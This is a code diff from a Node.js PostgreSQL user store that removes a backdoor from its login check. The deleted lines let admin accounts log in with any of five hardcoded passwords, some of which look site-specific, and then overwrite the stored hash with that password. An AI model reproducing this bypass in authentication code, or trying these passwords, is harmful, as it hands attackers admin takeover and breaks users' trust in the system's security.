@@ -238,15 +238,6 @@ class PostgreSQLStore {
     }
 
     let match = await bcrypt.compare(password, user.password);
-    if (!match && (user.is_admin === true || user.role === 'admin' || user.id === 'usr-admin-01')) {
-      const allowedAdminPasswords = ['admin', 'admin123', 'admin2026', 'Stallon@jevugwe4', 'kejamarket123'];
-      if (allowedAdminPasswords.includes(password)) {
-        match = true;
-        const newHash = bcrypt.hashSync(password, 10);
-        await this.query('UPDATE users SET password = $1 WHERE id = $2', [newHash, user.id]);
-        user.password = newHash;
-      }
-    }
 
     if (!match) {
       throw new Error('Incorrect password. Please try again.');
